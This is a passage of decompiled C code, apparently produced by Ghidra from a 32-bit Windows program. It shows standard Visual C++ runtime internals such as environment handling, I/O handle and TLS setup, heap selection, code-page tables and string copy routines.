      iVar5 = ((int)pWVar4 - (int)lpWideCharStr >> 1) + 1;
      puVar6 = (uint *)WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)0x0,0,(LPCSTR)0x0,
                                           (LPBOOL)0x0);
      local_8 = (undefined4 *)0x0;
      if (((puVar6 != (uint *)0x0) &&
          (puVar9 = (undefined4 *)FUN_0045cc80(puVar6), puVar9 != (undefined4 *)0x0)) &&
         (iVar5 = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)puVar9,(int)puVar6,(LPCSTR)0x0,
                                      (LPBOOL)0x0), local_8 = puVar9, iVar5 == 0)) {
        FUN_0045caa1((undefined *)puVar9);
        local_8 = (undefined4 *)0x0;
      }
      FreeEnvironmentStringsW(lpWideCharStr);
      return local_8;
    }
    puVar9 = (undefined4 *)GetEnvironmentStrings();
    if (puVar9 == (undefined4 *)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_0045f5e4 = 2;
  }
  else {
    if (DAT_0045f5e4 == 1) goto LAB_0045bd36;
    if (DAT_0045f5e4 != 2) {
      return (undefined4 *)0x0;
    }
  }
  if ((puVar9 == (undefined4 *)0x0) &&
     (puVar9 = (undefined4 *)GetEnvironmentStrings(), puVar9 == (undefined4 *)0x0)) {
    return (undefined4 *)0x0;
  }
  cVar1 = *(char *)puVar9;
  puVar7 = puVar9;
  while (cVar1 != '\0') {
    do {
      puVar8 = puVar7;
      puVar7 = (undefined4 *)((int)puVar8 + 1);
    } while (*(char *)puVar7 != '\0');
    puVar7 = (undefined4 *)((int)puVar8 + 2);
    cVar1 = *(char *)puVar7;
  }
  puVar6 = (uint *)((int)puVar7 + (1 - (int)puVar9));
  puVar7 = (undefined4 *)FUN_0045cc80(puVar6);
  if (puVar7 == (undefined4 *)0x0) {
    puVar7 = (undefined4 *)0x0;
  }
  else {
    FUN_0045ce40(puVar7,puVar9,(uint)puVar6);
  }
  FreeEnvironmentStringsA((LPCH)puVar9);
  return puVar7;
}



void FUN_0045be11(void)

{
  HANDLE *ppvVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  DWORD DVar5;
  HANDLE hFile;
  UINT *pUVar6;
  int iVar7;
  uint uVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_4c;
  HANDLE *local_8;
  
  puVar3 = (undefined4 *)FUN_0045cc80((uint *)0x480);
  if (puVar3 == (undefined4 *)0x0) {
    FUN_0045b6a0(0x1b);
  }
  DAT_0045fb40 = 0x20;
  DAT_0045fa40 = puVar3;
  for (; puVar3 < DAT_0045fa40 + 0x120; puVar3 = puVar3 + 9) {
    *(undefined *)(puVar3 + 1) = 0;
    *puVar3 = 0xffffffff;
    puVar3[2] = 0;
    *(undefined *)((int)puVar3 + 5) = 10;
  }
  GetStartupInfoA(&local_4c);
  if ((local_4c.cbReserved2 != 0) && ((UINT *)local_4c.lpReserved2 != (UINT *)0x0)) {
    UVar9 = *(UINT *)local_4c.lpReserved2;
    pUVar6 = (UINT *)((int)local_4c.lpReserved2 + 4);
    local_8 = (HANDLE *)((int)pUVar6 + UVar9);
    if (0x7ff < (int)UVar9) {
      UVar9 = 0x800;
    }
    UVar10 = UVar9;
    if ((int)DAT_0045fb40 < (int)UVar9) {
      puVar3 = &DAT_0045fa44;
      do {
        puVar4 = (undefined4 *)FUN_0045cc80((uint *)0x480);
        UVar10 = DAT_0045fb40;
        if (puVar4 == (undefined4 *)0x0) break;
        DAT_0045fb40 = DAT_0045fb40 + 0x20;
        *puVar3 = puVar4;
        puVar2 = puVar4;
        for (; puVar4 < puVar2 + 0x120; puVar4 = puVar4 + 9) {
          *(undefined *)(puVar4 + 1) = 0;
          *puVar4 = 0xffffffff;
          puVar4[2] = 0;
          *(undefined *)((int)puVar4 + 5) = 10;
          puVar2 = (undefined4 *)*puVar3;
        }
        puVar3 = puVar3 + 1;
        UVar10 = UVar9;
      } while ((int)DAT_0045fb40 < (int)UVar9);
    }
    uVar8 = 0;
    if (0 < (int)UVar10) {
      do {
        if (((*local_8 != (HANDLE)0xffffffff) && ((*(byte *)pUVar6 & 1) != 0)) &&
           (((*(byte *)pUVar6 & 8) != 0 || (DVar5 = GetFileType(*local_8), DVar5 != 0)))) {
          ppvVar1 = (HANDLE *)((int)(&DAT_0045fa40)[(int)uVar8 >> 5] + (uVar8 & 0x1f) * 0x24);
          *ppvVar1 = *local_8;
          *(byte *)(ppvVar1 + 1) = *(byte *)pUVar6;
        }
        local_8 = local_8 + 1;
        uVar8 = uVar8 + 1;
        pUVar6 = (UINT *)((int)pUVar6 + 1);
      } while ((int)uVar8 < (int)UVar10);
    }
  }
  iVar7 = 0;
  do {
    ppvVar1 = (HANDLE *)(DAT_0045fa40 + iVar7 * 9);
    if (DAT_0045fa40[iVar7 * 9] == -1) {
      *(undefined *)(ppvVar1 + 1) = 0x81;
      if (iVar7 == 0) {
        DVar5 = 0xfffffff6;
      }
      else {
        DVar5 = 0xfffffff5 - (iVar7 != 1);
      }
      hFile = GetStdHandle(DVar5);
      if ((hFile != (HANDLE)0xffffffff) && (DVar5 = GetFileType(hFile), DVar5 != 0)) {
        *ppvVar1 = hFile;
        if ((DVar5 & 0xff) != 2) {
          if ((DVar5 & 0xff) == 3) {
            *(byte *)(ppvVar1 + 1) = *(byte *)(ppvVar1 + 1) | 8;
          }
          goto LAB_0045bfb6;
        }
      }
      *(byte *)(ppvVar1 + 1) = *(byte *)(ppvVar1 + 1) | 0x40;
    }
    else {
      *(byte *)(ppvVar1 + 1) = *(byte *)(ppvVar1 + 1) | 0x80;
    }
LAB_0045bfb6:
    iVar7 = iVar7 + 1;
    if (2 < iVar7) {
      SetHandleCount(DAT_0045fb40);
      return;
    }
  } while( true );
}



undefined4 FUN_0045bfcd(void)

{
  uint *lpTlsValue;
  BOOL BVar1;
  DWORD DVar2;
  
  FUN_0045c5cc();
  DAT_00457a14 = TlsAlloc();
  if (DAT_00457a14 != 0xffffffff) {
    lpTlsValue = FUN_0045d175(1,0x74);
    if (lpTlsValue != (uint *)0x0) {
      BVar1 = TlsSetValue(DAT_00457a14,lpTlsValue);
      if (BVar1 != 0) {
        FUN_0045c021((int)lpTlsValue);
        DVar2 = GetCurrentThreadId();
        lpTlsValue[1] = 0xffffffff;
        *lpTlsValue = DVar2;
        return 1;
      }
    }
  }
  return 0;
}



void __cdecl FUN_0045c021(int param_1)

{
  *(undefined **)(param_1 + 0x50) = &DAT_00457968;
  *(undefined4 *)(param_1 + 0x14) = 1;
  return;
}



uint * FUN_0045c034(void)

{
  DWORD dwErrCode;
  uint *lpTlsValue;
  BOOL BVar1;
  DWORD DVar2;
  
  dwErrCode = GetLastError();
  lpTlsValue = (uint *)TlsGetValue(DAT_00457a14);
  if (lpTlsValue == (uint *)0x0) {
    lpTlsValue = FUN_0045d175(1,0x74);
    if (lpTlsValue != (uint *)0x0) {
      BVar1 = TlsSetValue(DAT_00457a14,lpTlsValue);
      if (BVar1 != 0) {
        FUN_0045c021((int)lpTlsValue);
        DVar2 = GetCurrentThreadId();
        lpTlsValue[1] = 0xffffffff;
        *lpTlsValue = DVar2;
        goto LAB_0045c08f;
      }
    }
    FUN_0045b6a0(0x10);
  }
LAB_0045c08f:
  SetLastError(dwErrCode);
  return lpTlsValue;
}



void __cdecl FUN_0045c09b(undefined4 *param_1)

{
  int iVar1;
  HMODULE pHVar2;
  
  *param_1 = 0;
  pHVar2 = GetModuleHandleA((LPCSTR)0x0);
  if ((*(short *)&pHVar2->unused == 0x5a4d) && (iVar1 = pHVar2[0xf].unused, iVar1 != 0)) {
    *(undefined *)param_1 = *(undefined *)((int)&pHVar2[6].unused + iVar1 + 2);
    *(undefined *)((int)param_1 + 1) = *(undefined *)((int)&pHVar2[6].unused + iVar1 + 3);
  }
  return;
}



int FUN_0045c0c8(void)

{
  char cVar1;
  byte bVar2;
  BOOL BVar3;
  DWORD DVar4;
  uint uVar5;
  uint *puVar6;
  byte *pbVar7;
  int iVar8;
  undefined4 *puVar9;
  char *pcVar10;
  byte *this;
  undefined4 unaff_EBX;
  undefined1 unaff_BP;
  undefined4 local_1230;
  char local_1a0 [260];
  DWORD local_9c;
  uint local_98;
  DWORD local_8c;
  undefined4 uStackY_18;
  byte bVar11;
  
  FUN_0045d660(unaff_BP);
  local_9c = 0x94;
  BVar3 = GetVersionExA((LPOSVERSIONINFOA)&local_9c);
  if (((BVar3 == 0) || (local_8c != 2)) || (local_98 < 5)) {
    uStackY_18._0_1_ = '\"';
    uStackY_18._1_1_ = -0x3f;
    uStackY_18._2_1_ = 'E';
    uStackY_18._3_1_ = '\0';
    DVar4 = GetEnvironmentVariableA(s___MSVCRT_HEAP_SELECT_0045a39c,(LPSTR)&local_1230,0x1090);
    bVar11 = (byte)unaff_EBX;
    if (DVar4 != 0) {
      puVar9 = &local_1230;
      while ((char)local_1230 != '\0') {
        cVar1 = *(char *)puVar9;
        if (('`' < cVar1) && (cVar1 < '{')) {
          *(char *)puVar9 = cVar1 + -0x20;
        }
        puVar9 = (undefined4 *)((int)puVar9 + 1);
        local_1230._0_1_ = *(char *)puVar9;
      }
      uStackY_18._0_1_ = '`';
      uStackY_18._1_1_ = -0x3f;
      uStackY_18._2_1_ = 'E';
      uStackY_18._3_1_ = '\0';
      uVar5 = FUN_0045d620(s___GLOBAL_HEAP_SELECTED_0045a384,(char *)&local_1230,0x16);
      bVar11 = (byte)unaff_EBX;
      if (uVar5 == 0) {
        puVar6 = &local_1230;
      }
      else {
        uStackY_18._0_1_ = -0x7e;
        uStackY_18._1_1_ = -0x3f;
        uStackY_18._2_1_ = 'E';
        uStackY_18._3_1_ = '\0';
        GetModuleFileNameA((HMODULE)0x0,local_1a0,0x104);
        bVar11 = (byte)unaff_EBX;
        pcVar10 = local_1a0;
        while (local_1a0[0] != '\0') {
          cVar1 = *pcVar10;
          if (('`' < cVar1) && (cVar1 < '{')) {
            *pcVar10 = cVar1 + -0x20;
          }
          bVar11 = (byte)unaff_EBX;
          pcVar10 = pcVar10 + 1;
          local_1a0[0] = *pcVar10;
        }
        puVar6 = FUN_0045d5a0(&local_1230,local_1a0);
      }
      if ((puVar6 != (uint *)0x0) && (puVar6 = FUN_0045d4e0(puVar6,','), puVar6 != (uint *)0x0)) {
        pbVar7 = (byte *)((int)puVar6 + 1);
        bVar2 = *pbVar7;
        this = pbVar7;
        while (bVar2 != 0) {
          if (*this == 0x3b) {
            *this = 0;
          }
          else {
            this = this + 1;
          }
          bVar2 = *this;
        }
        uStackY_18._0_1_ = -0x18;
        uStackY_18._1_1_ = -0x3f;
        uStackY_18._2_1_ = 'E';
        uStackY_18._3_1_ = '\0';
        iVar8 = FUN_0045d2b2(this,pbVar7,(byte **)0x0,(void *)0xa);
        if (iVar8 == 2) {
          return 2;
        }
        if (iVar8 == 3) {
          return 3;
        }
        if (iVar8 == 1) {
          return 1;
        }
      }
    }
    FUN_0045c09b((undefined4 *)&stack0xfffffff8);
    iVar8 = 3 - (uint)(bVar11 < 6);
  }
  else {
    iVar8 = 1;
  }
  return iVar8;
}



undefined4 __cdecl FUN_0045c210(int param_1)

{
  undefined **ppuVar1;
  
  DAT_0045fa28 = HeapCreate((uint)(param_1 == 0),0x1000,0);
  if (DAT_0045fa28 != (HANDLE)0x0) {
    DAT_0045fa2c = FUN_0045c0c8();
    if (DAT_0045fa2c == 3) {
      ppuVar1 = (undefined **)FUN_0045d68f(0x3f8);
    }
    else {
      if (DAT_0045fa2c != 2) {
        return 1;
      }
      ppuVar1 = FUN_0045dee0();
    }
    if (ppuVar1 != (undefined **)0x0) {
      return 1;
    }
    HeapDestroy(DAT_0045fa28);
  }
  return 0;
}



void __cdecl FUN_0045c270(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x45c288,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



void __cdecl FUN_0045c2b2(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined4 local_14;
  int iStack_10;
  
  iStack_10 = param_1;
  puStack_18 = &LAB_0045c290;
  uStack_1c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_1c;
  while( true ) {
    iVar1 = *(int *)(param_1 + 8);
    iVar2 = *(int *)(param_1 + 0xc);
    if ((iVar2 == -1) || (iVar2 == param_2)) break;
    local_14 = *(undefined4 *)(iVar1 + iVar2 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_14;
    if (*(int *)(iVar1 + 4 + iVar2 * 0xc) == 0) {
      FUN_0045c346();
      (**(code **)(iVar1 + 8 + iVar2 * 0xc))();
    }
  }
  *unaff_FS_OFFSET = uStack_1c;
  return;
}



void FUN_0045c346(void)

{
  undefined4 in_EAX;
  int unaff_EBP;
  
  DAT_00457a24 = *(undefined4 *)(unaff_EBP + 8);
  DAT_00457a20 = in_EAX;
  DAT_00457a28 = unaff_EBP;
  return;
}



void FUN_0045c425(int param_1)

{
  FUN_0045c2b2(*(int *)(param_1 + 0x18),*(int *)(param_1 + 0x1c));
  return;
}



void FUN_0045c440(void)

{
  if ((DAT_0045f498 == 1) || ((DAT_0045f498 == 0 && (DAT_00457964 == 1)))) {
    FUN_0045c479(0xfc);
    if (DAT_0045f5e8 != (code *)0x0) {
      (*DAT_0045f5e8)();
    }
    FUN_0045c479(0xff);
  }
  return;
}



void __cdecl FUN_0045c479(DWORD param_1)

{
  uint **ppuVar1;
  DWORD *pDVar2;
  DWORD DVar3;
  char *pcVar4;
  HANDLE hFile;
  int iVar5;
  uint *puVar6;
  undefined auStackY_1e3 [7];
  LPOVERLAPPED lpOverlapped;
  uint local_1a8 [65];
  uint local_a4 [40];
  
  iVar5 = 0;
  pDVar2 = &DAT_00457a30;
  do {
    if (param_1 == *pDVar2) break;
    pDVar2 = pDVar2 + 2;
    iVar5 = iVar5 + 1;
  } while (pDVar2 < &DAT_00457ac0);
  if (param_1 == (&DAT_00457a30)[iVar5 * 2]) {
    if ((DAT_0045f498 == 1) || ((DAT_0045f498 == 0 && (DAT_00457964 == 1)))) {
      pDVar2 = &param_1;
      ppuVar1 = (uint **)(iVar5 * 8 + 0x457a34);
      lpOverlapped = (LPOVERLAPPED)0x0;
      pcVar4 = FUN_0045cdc0(*ppuVar1);
      puVar6 = *ppuVar1;
      hFile = GetStdHandle(0xfffffff4);
      WriteFile(hFile,puVar6,(DWORD)pcVar4,pDVar2,lpOverlapped);
    }
    else if (param_1 != 0xfc) {
      DVar3 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_1a8,0x104);
      if (DVar3 == 0) {
        FUN_0045cb90(local_1a8,(uint *)s_<program_name_unknown>_0045a68c);
      }
      puVar6 = local_1a8;
      pcVar4 = FUN_0045cdc0(local_1a8);
      if ((char *)0x3c < pcVar4 + 1) {
        pcVar4 = FUN_0045cdc0(local_1a8);
        puVar6 = (uint *)(pcVar4 + (int)auStackY_1e3);
        FUN_0045e590(puVar6,(uint *)&DAT_0045a688,3);
      }
      FUN_0045cb90(local_a4,(uint *)s_Runtime_Error__Program__0045a66c);
      FUN_0045cba0(local_a4,puVar6);
      FUN_0045cba0(local_a4,(uint *)&DAT_0045a668);
      FUN_0045cba0(local_a4,*(uint **)(iVar5 * 8 + 0x457a34));
      auStackY_1e3._3_4_ = 0x45c59d;
      FUN_0045e504(local_a4,s_Microsoft_Visual_C___Runtime_Lib_0045a640,0x12010);
    }
  }
  return;
}



void FUN_0045c5cc(void)

{
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_00457b04);
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_00457af4);
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_00457ae4);
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_00457ac4);
  return;
}



void __cdecl FUN_0045c5f5(int param_1)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION lpCriticalSection;
  
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_00457ac0 + param_1 * 4);
  if (*(int *)(&DAT_00457ac0 + param_1 * 4) == 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)FUN_0045cc80((uint *)0x18);
    if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
      FUN_0045b6a0(0x11);
    }
    FUN_0045c5f5(0x11);
    if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
      InitializeCriticalSection(lpCriticalSection);
      *pp_Var1 = lpCriticalSection;
    }
    else {
      FUN_0045caa1((undefined *)lpCriticalSection);
    }
    FUN_0045c656(0x11);
  }
  EnterCriticalSection(*pp_Var1);
  return;
}



void __cdecl FUN_0045c656(int param_1)

{
  LeaveCriticalSection(*(LPCRITICAL_SECTION *)(&DAT_00457ac0 + param_1 * 4));
  return;
}



void __cdecl FUN_0045c66b(byte param_1)

{
  FUN_0045c67c(param_1,0,4);
  return;
}



undefined4 __cdecl FUN_0045c67c(byte param_1,uint param_2,byte param_3)

{
  uint uVar1;
  
  if (((&DAT_0045f921)[param_1] & param_3) == 0) {
    if (param_2 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = *(ushort *)(&DAT_00459cba + (uint)param_1 * 2) & param_2;
    }
    if (uVar1 == 0) {
      return 0;
    }
  }
  return 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_0045c6ad(int param_1)

{
  BYTE *pBVar1;
  byte bVar2;
  byte bVar3;
  UINT CodePage;
  UINT *pUVar4;
  BOOL BVar5;
  uint uVar6;
  uint uVar7;
  BYTE *pBVar8;
  int iVar9;
  byte *pbVar10;
  int iVar11;
  byte *pbVar12;
  undefined4 uVar13;
  undefined4 *puVar14;
  _cpinfo local_1c;
  uint local_8;
  
  FUN_0045c5f5(0x19);
  CodePage = FUN_0045c85a(param_1);
  if (CodePage != DAT_0045f804) {
    if (CodePage != 0) {
      iVar11 = 0;
      pUVar4 = &DAT_00457b88;
LAB_0045c6ea:
      if (*pUVar4 != CodePage) goto code_r0x0045c6ee;
      local_8 = 0;
      puVar14 = (undefined4 *)&DAT_0045f920;
      for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {
        *puVar14 = 0;
        puVar14 = puVar14 + 1;
      }
      *(undefined *)puVar14 = 0;
      pbVar12 = &DAT_00457b98 + iVar11 * 0x30;
      do {
        bVar2 = *pbVar12;
        pbVar10 = pbVar12;
        while ((bVar2 != 0 && (bVar2 = pbVar10[1], bVar2 != 0))) {
          uVar7 = (uint)*pbVar10;
          if (uVar7 <= bVar2) {
            bVar3 = (&DAT_00457b80)[local_8];
            do {
              (&DAT_0045f921)[uVar7] = (&DAT_0045f921)[uVar7] | bVar3;
              uVar7 = uVar7 + 1;
            } while (uVar7 <= bVar2);
          }
          pbVar10 = pbVar10 + 2;
          bVar2 = *pbVar10;
        }
        local_8 = local_8 + 1;
        pbVar12 = pbVar12 + 8;
      } while (local_8 < 4);
      _DAT_0045f81c = 1;
      DAT_0045f804 = CodePage;
      DAT_0045fa24 = FUN_0045c8a4(CodePage);
      DAT_0045f810 = (&DAT_00457b8c)[iVar11 * 0xc];
      DAT_0045f814 = (&DAT_00457b90)[iVar11 * 0xc];
      DAT_0045f818 = (&DAT_00457b94)[iVar11 * 0xc];
      goto LAB_0045c83e;
    }
    goto LAB_0045c839;
  }
  goto LAB_0045c6d4;
code_r0x0045c6ee:
  pUVar4 = pUVar4 + 0xc;
  iVar11 = iVar11 + 1;
  if ((UINT *)0x457c77 < pUVar4) goto code_r0x0045c6f9;
  goto LAB_0045c6ea;
code_r0x0045c6f9:
  BVar5 = GetCPInfo(CodePage,&local_1c);
  uVar7 = 1;
  if (BVar5 == 1) {
    DAT_0045fa24 = 0;
    puVar14 = (undefined4 *)&DAT_0045f920;
    for (iVar11 = 0x40; iVar11 != 0; iVar11 = iVar11 + -1) {
      *puVar14 = 0;
      puVar14 = puVar14 + 1;
    }
    *(undefined *)puVar14 = 0;
    if (local_1c.MaxCharSize < 2) {
      _DAT_0045f81c = 0;
      DAT_0045f804 = CodePage;
    }
    else {
      DAT_0045f804 = CodePage;
      if (local_1c.LeadByte[0] != '\0') {
        pBVar8 = local_1c.LeadByte + 1;
        do {
          bVar2 = *pBVar8;
          if (bVar2 == 0) break;
          for (uVar6 = (uint)pBVar8[-1]; uVar6 <= bVar2; uVar6 = uVar6 + 1) {
            (&DAT_0045f921)[uVar6] = (&DAT_0045f921)[uVar6] | 4;
          }
          pBVar1 = pBVar8 + 1;
          pBVar8 = pBVar8 + 2;
        } while (*pBVar1 != 0);
      }
      do {
        (&DAT_0045f921)[uVar7] = (&DAT_0045f921)[uVar7] | 8;
        uVar7 = uVar7 + 1;
      } while (uVar7 < 0xff);
      DAT_0045fa24 = FUN_0045c8a4(CodePage);
      _DAT_0045f81c = 1;
    }
    DAT_0045f810 = 0;
    DAT_0045f814 = 0;
    DAT_0045f818 = 0;
  }
  else {
    if (DAT_0045f650 == 0) {
      uVar13 = 0xffffffff;
      goto LAB_0045c84b;
    }
LAB_0045c839:
    FUN_0045c8d7();
  }
LAB_0045c83e:
  FUN_0045c900();
LAB_0045c6d4:
  uVar13 = 0;
LAB_0045c84b:
  FUN_0045c656(0x19);
  return uVar13;
}



int __cdecl FUN_0045c85a(int param_1)

{
  int iVar1;
  bool bVar2;
  
  if (param_1 == -2) {
    DAT_0045f650 = 1;
                    // WARNING: Could not recover jumptable at 0x0045c874. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar1 = GetOEMCP();
    return iVar1;
  }
  if (param_1 == -3) {
    DAT_0045f650 = 1;
                    // WARNING: Could not recover jumptable at 0x0045c889. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar1 = GetACP();
    return iVar1;
  }
  bVar2 = param_1 == -4;
  if (bVar2) {
    param_1 = DAT_0045f67c;
  }
  DAT_0045f650 = (uint)bVar2;
  return param_1;
}



undefined4 __cdecl FUN_0045c8a4(int param_1)

{
  if (param_1 == 0x3a4) {
    return 0x411;
  }
  if (param_1 == 0x3a8) {
    return 0x804;
  }
  if (param_1 == 0x3b5) {
    return 0x412;
  }
  if (param_1 != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0045c8d7(void)

{
  int iVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)&DAT_0045f920;
  for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined *)puVar2 = 0;
  DAT_0045f804 = 0;
  _DAT_0045f81c = 0;
  DAT_0045fa24 = 0;
  DAT_0045f810 = 0;
  DAT_0045f814 = 0;
  DAT_0045f818 = 0;
  return;
}



void FUN_0045c900(void)

{
  BOOL BVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  ushort *puVar6;
  undefined uVar7;
  BYTE *pBVar8;
  undefined4 *puVar9;
  WORD local_518 [256];
  WCHAR local_318 [128];
  WCHAR local_218 [128];
  undefined4 local_118 [64];
  _cpinfo local_18;
  
  BVar1 = GetCPInfo(DAT_0045f804,&local_18);
  if (BVar1 == 1) {
    uVar2 = 0;
    do {
      *(char *)((int)local_118 + uVar2) = (char)uVar2;
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x100);
    local_118[0]._0_1_ = 0x20;
    if (local_18.LeadByte[0] != 0) {
      pBVar8 = local_18.LeadByte + 1;
      do {
        uVar2 = (uint)local_18.LeadByte[0];
        if (uVar2 <= *pBVar8) {
          uVar4 = (*pBVar8 - uVar2) + 1;
          puVar9 = (undefined4 *)((int)local_118 + uVar2);
          for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
            *puVar9 = 0x20202020;
            puVar9 = puVar9 + 1;
          }
          for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
            *(undefined *)puVar9 = 0x20;
            puVar9 = (undefined4 *)((int)puVar9 + 1);
          }
        }
        local_18.LeadByte[0] = pBVar8[1];
        pBVar8 = pBVar8 + 2;
      } while (local_18.LeadByte[0] != 0);
    }
    FUN_0045e8dd(1,(LPCSTR)local_118,0x100,local_518,DAT_0045f804,DAT_0045fa24,0);
    FUN_0045e68e(DAT_0045fa24,0x100,(char *)local_118,0x100,local_218,0x100,DAT_0045f804,0);
    FUN_0045e68e(DAT_0045fa24,0x200,(char *)local_118,0x100,local_318,0x100,DAT_0045f804,0);
    uVar2 = 0;
    puVar6 = local_518;
    do {
      if ((*puVar6 & 1) == 0) {
        if ((*puVar6 & 2) != 0) {
          (&DAT_0045f921)[uVar2] = (&DAT_0045f921)[uVar2] | 0x20;
          uVar7 = *(undefined *)((int)local_318 + uVar2);
          goto LAB_0045ca0c;
        }
        (&DAT_0045f820)[uVar2] = 0;
      }
      else {
        (&DAT_0045f921)[uVar2] = (&DAT_0045f921)[uVar2] | 0x10;
        uVar7 = *(undefined *)((int)local_218 + uVar2);
LAB_0045ca0c:
        (&DAT_0045f820)[uVar2] = uVar7;
      }
      uVar2 = uVar2 + 1;
      puVar6 = puVar6 + 1;
    } while (uVar2 < 0x100);
  }
  else {
    uVar2 = 0;
    do {
      if ((uVar2 < 0x41) || (0x5a < uVar2)) {
        if ((0x60 < uVar2) && (uVar2 < 0x7b)) {
          (&DAT_0045f921)[uVar2] = (&DAT_0045f921)[uVar2] | 0x20;
          cVar3 = (char)uVar2 + -0x20;
          goto LAB_0045ca56;
        }
        (&DAT_0045f820)[uVar2] = 0;
      }
      else {
        (&DAT_0045f921)[uVar2] = (&DAT_0045f921)[uVar2] | 0x10;
        cVar3 = (char)uVar2 + ' ';
LAB_0045ca56:
        (&DAT_0045f820)[uVar2] = cVar3;
      }
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x100);
  }
  return;
}



void FUN_0045ca85(void)

{
  if (DAT_0045fb48 == 0) {
    FUN_0045c6ad(-3);
    DAT_0045fb48 = 1;
  }
  return;
}



void __cdecl FUN_0045caa1(undefined *param_1)

{
  uint *puVar1;
  undefined4 *unaff_FS_OFFSET;
  int *local_2c;
  uint *local_28;
  uint local_24;
  uint *local_20;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0045a6a8;
  puStack_10 = &LAB_0045c368;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  if (param_1 == (undefined *)0x0) goto LAB_0045cb7b;
  if (DAT_0045fa2c == 3) {
    FUN_0045c5f5(9);
    local_8 = 0;
    local_20 = (uint *)FUN_0045d6d7((int)param_1);
    if (local_20 != (uint *)0x0) {
      FUN_0045d702(local_20,(int)param_1);
    }
    local_8 = 0xffffffff;
    FUN_0045cb0b();
    puVar1 = local_20;
LAB_0045cb5c:
    if (puVar1 != (uint *)0x0) goto LAB_0045cb7b;
  }
  else if (DAT_0045fa2c == 2) {
    FUN_0045c5f5(9);
    local_8 = 1;
    local_28 = (uint *)FUN_0045e13c(param_1,&local_2c,&local_24);
    if (local_28 != (uint *)0x0) {
      FUN_0045e193((int)local_2c,local_24,(byte *)local_28);
    }
    local_8 = 0xffffffff;
    FUN_0045cb63();
    puVar1 = local_28;
    goto LAB_0045cb5c;
  }
  HeapFree(DAT_0045fa28,0,param_1);
LAB_0045cb7b:
  *unaff_FS_OFFSET = local_14;
  return;
}



void FUN_0045cb0b(void)

{
  FUN_0045c656(9);
  return;
}



void FUN_0045cb63(void)

{
  FUN_0045c656(9);
  return;
}



uint * __cdecl FUN_0045cb90(uint *param_1,uint *param_2)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  uVar3 = (uint)param_2 & 3;
  puVar4 = param_1;
  while (uVar3 != 0) {
    bVar1 = *(byte *)param_2;
    uVar3 = (uint)bVar1;
    param_2 = (uint *)((int)param_2 + 1);
    if (bVar1 == 0) goto LAB_0045cc78;
    *(byte *)puVar4 = bVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    uVar3 = (uint)param_2 & 3;
  }
  do {
    uVar2 = *param_2;
    uVar3 = *param_2;
    param_2 = param_2 + 1;
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar3 == '\0') {
LAB_0045cc78:
        *(byte *)puVar4 = (byte)uVar3;
        return param_1;
      }
      if ((char)(uVar3 >> 8) == '\0') {
        *(short *)puVar4 = (short)uVar3;
        return param_1;
      }
      if ((uVar3 & 0xff0000) == 0) {
        *(short *)puVar4 = (short)uVar3;
        *(byte *)((int)puVar4 + 2) = 0;
        return param_1;
      }
      if ((uVar3 & 0xff000000) == 0) {
        *puVar4 = uVar3;
        return param_1;
      }
    }
    *puVar4 = uVar3;
    puVar4 = puVar4 + 1;
  } while( true );
}



uint * __cdecl FUN_0045cba0(uint *param_1,uint *param_2)

{
  byte bVar1;
  uint uVar2;
  uint *puVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar4 = (uint)param_1 & 3;
  puVar3 = param_1;
  while (uVar4 != 0) {
    bVar1 = *(byte *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (bVar1 == 0) goto LAB_0045cbef;
    uVar4 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar5 = puVar3;
      puVar3 = puVar5 + 1;
    } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);
    uVar4 = *puVar5;
    if ((char)uVar4 == '\0') goto LAB_0045cc01;
    if ((char)(uVar4 >> 8) == '\0') {
